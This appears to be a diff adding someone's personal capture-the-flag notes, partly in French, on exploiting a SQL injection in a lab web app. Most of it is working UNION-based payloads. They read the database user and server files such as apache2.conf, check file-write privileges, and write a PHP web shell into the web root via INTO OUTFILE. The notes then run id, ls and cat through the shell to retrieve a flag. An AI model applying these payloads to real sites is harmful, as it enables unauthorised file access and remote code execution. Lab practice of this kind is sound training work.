@@ -1,0 +1,60 @@
+cn' UNION SELECT 1, user(), 3, 4, 5-- -
+	root@localhost
+
+cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - 	Find which directories can be accessed through 
+
+cn' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4,5-- -
+
+
+
+cn' union select 1,'file written successfully!',3,4, 5 into outfile '/etc/proof.txt'-- -
+
+
+
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -
+		permission denied
+		les perms etait refuser car l'aborescence ./ netais pas respecter
+		il faut ajouter le dashboard au path
+		
+
++ voir fichhier conf 
+/etc/apache2/apache2.conf
+
+cn' UNION SELECT 1, super_priv, 3, 4,5 FROM mysql.user WHERE user="root"-- -
+
+cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
+
+
+les perms sont autoriser donc ajt le payload en respectant le path:
+
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
+
+le fichier est ecrit
+
+http://94.237.56.76:44111/dashboard/shell.php?0=id pour lire
+?0=id est important
+
+cn' union select "",'<?php system(ls); ?>', "", "", "" into outfile '/var/www/html/dashboard/ls.php'-- -
+
+
+operateur for multiple commannds
+&& -> ne marche que en ajt les " " string dans le payload php shell web 
+
+voir les dossiers a la racine -> dir /
+
+cn' union select "",'<?php system("dir /); ?>', "", "", "" into outfile '/var/www/html/dashboard/cat.php'-- -
+
+
+ou utiliser 'cd / && ls'
+
+flag_cae1dadcd174.txt
+
+fichier trouvé 
+
+
+cat  pour le lire:
+cn' union select "",'<?php system("cat /flag_cae1dadcd174.txt"); ?>', "", "", "" into outfile '/var/www/html/dashboard/cat.php'-- -
+
+Flag found
+
+528d6d9cedc2c7aab146ef226e918396
